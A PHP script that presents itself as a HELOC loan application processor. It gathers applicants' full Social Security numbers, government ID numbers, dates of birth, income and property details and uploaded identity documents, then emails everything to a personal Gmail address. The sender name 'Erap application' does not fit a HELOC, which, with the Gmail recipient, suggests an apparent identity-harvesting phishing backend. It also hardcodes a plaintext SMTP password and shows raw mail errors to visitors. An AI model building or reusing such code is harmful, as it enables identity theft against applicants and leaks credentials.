<?php
/**
 * HELOC Application Processor
 * Sends full application details, including full SSN and file uploads, via SMTP (PHPMailer-compatible).
 */
require_once __DIR__ . '/simple-mailer.php';

$smtp = [
    'host'       => 'smtp.hostinger.com',
    'port'       => 465,
    'username'   => 'contact@earnestexpressllc.com',
    'password'   => 'Weareallmad123@',
    'secure'     => 'ssl',
    'from_email' => 'contact@earnestexpressllc.com',
    'from_name'  => 'Erap application',
    'to_email'   => 'earnestexpress12@gmail.com',
];

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $clean = function ($key) {
        return isset($_POST[$key]) ? trim((string)$_POST[$key]) : '';
    };

    $name               = $clean('full_name');
    $dob                = $clean('date_of_birth');
    $phone              = $clean('phone');
    $email              = $clean('email');
    $ssn                = $clean('ssn');
    $gov_id             = $clean('gov_id_number');
    $issuing_state      = $clean('issuing_state');
    $id_expiration      = $clean('id_expiration');
    $employment_status  = $clean('employment_status');
    $employer_name      = $clean('employer_name');
    $job_title          = $clean('job_title');
    $employment_length  = $clean('employment_length');
    $gross_income       = $clean('gross_monthly_income');
    $other_income       = $clean('other_income_sources');
    $property_address   = $clean('property_address');
    $property_type      = $clean('property_type');
    $primary_residence  = isset($_POST['primary_residence']) ? 'Yes' : 'No';
    $year_purchased     = $clean('year_purchased');
    $purchase_price     = $clean('purchase_price');
    $current_value      = $clean('current_value');
    $mortgage_balance   = $clean('mortgage_balance');
    $lender_name        = $clean('lender_name');
    $credit_score       = $clean('credit_score_range');
    $monthly_payment    = $clean('monthly_mortgage_payment');
    $other_debts        = $clean('other_monthly_debts');
    $bankruptcy_history = isset($_POST['bankruptcy_history']) ? 'Yes' : 'No';
    $foreclosure_history= isset($_POST['foreclosure_history']) ? 'Yes' : 'No';
    $requested_line     = $clean('requested_credit_line');
    $use_of_funds       = $clean('use_of_funds');
    $draw_period        = $clean('preferred_draw_period');
    $repayment_term     = $clean('preferred_repayment_term');
    $credit_pull_auth   = isset($_POST['credit_pull_auth']) ? 'Yes' : 'No';
    $certification      = isset($_POST['certification']) ? 'Yes' : 'No';
    $terms_agreement    = isset($_POST['terms_agreement']) ? 'Yes' : 'No';
    $digital_signature  = $clean('digital_signature');
    $signature_date     = $clean('signature_date');

    $ltv = 0;
    if ($current_value !== '' && $current_value > 0) {
        $total_debt = (float)$mortgage_balance + (float)$requested_line;
        $ltv = ($total_debt / (float)$current_value) * 100;
    }

    $fields = [
        "FULL NAME" => $name,
        "DATE OF BIRTH" => $dob,
        "PHONE" => $phone,
        "EMAIL" => $email,
        "FULL SSN" => $ssn,
        "GOVERNMENT ID NUMBER" => $gov_id,
        "ISSUING STATE" => $issuing_state,
        "ID EXPIRATION DATE" => $id_expiration,
        "EMPLOYMENT STATUS" => $employment_status,
        "EMPLOYER NAME" => $employer_name,
        "JOB TITLE" => $job_title,
        "LENGTH OF EMPLOYMENT" => $employment_length,
        "GROSS MONTHLY INCOME" => $gross_income,
        "OTHER INCOME SOURCES" => $other_income,
        "PROPERTY ADDRESS" => $property_address,
        "PROPERTY TYPE" => $property_type,
        "PRIMARY RESIDENCE" => $primary_residence,
        "YEAR PURCHASED" => $year_purchased,
        "PURCHASE PRICE" => $purchase_price,
        "ESTIMATED CURRENT VALUE" => $current_value,
        "OUTSTANDING MORTGAGE BALANCE" => $mortgage_balance,
        "CURRENT MORTGAGE LENDER" => $lender_name,
        "ESTIMATED CREDIT SCORE RANGE" => $credit_score,
        "MONTHLY MORTGAGE PAYMENT" => $monthly_payment,
        "OTHER MONTHLY DEBTS" => $other_debts,
        "BANKRUPTCY HISTORY" => $bankruptcy_history,
        "FORECLOSURE HISTORY" => $foreclosure_history,
        "REQUESTED CREDIT LINE AMOUNT" => $requested_line,
        "INTENDED USE OF FUNDS" => $use_of_funds,
        "PREFERRED DRAW PERIOD" => $draw_period,
        "PREFERRED REPAYMENT TERM" => $repayment_term,
        "CALCULATED CLTV (%)" => round($ltv, 2),
        "CREDIT PULL AUTHORIZATION" => $credit_pull_auth,
        "CERTIFICATION" => $certification,
        "AGREEMENT TO TERMS" => $terms_agreement,
        "DIGITAL SIGNATURE" => $digital_signature,
        "SIGNATURE DATE" => $signature_date,
    ];

    $attachments = [
        'proof_identity' => 'Proof of Identity',
        'proof_income' => 'Proof of Income',
        'mortgage_statement' => 'Mortgage Statement',
        'homeowners_insurance' => 'Homeowners Insurance',
        'property_tax_statement' => 'Property Tax Statement',
    ];

    $errorMessage = null;
    $sent = send_application_email(
        $smtp,
        "NEW HELOC APPLICATION: {$name}",
        $fields,
        $attachments,
        $email,
        $errorMessage
    );

    if ($sent) {
        header("Location: ../success.html");
        exit();
    }

    echo "An error occurred. Please try again later.";
    $detail = $errorMessage ? "Error: {$errorMessage}" : 'Unable to send application email.';
    echo "<pre>" . htmlspecialchars($detail) . "</pre>";
} else {
    header("Location: ../index.html");
    exit();
}
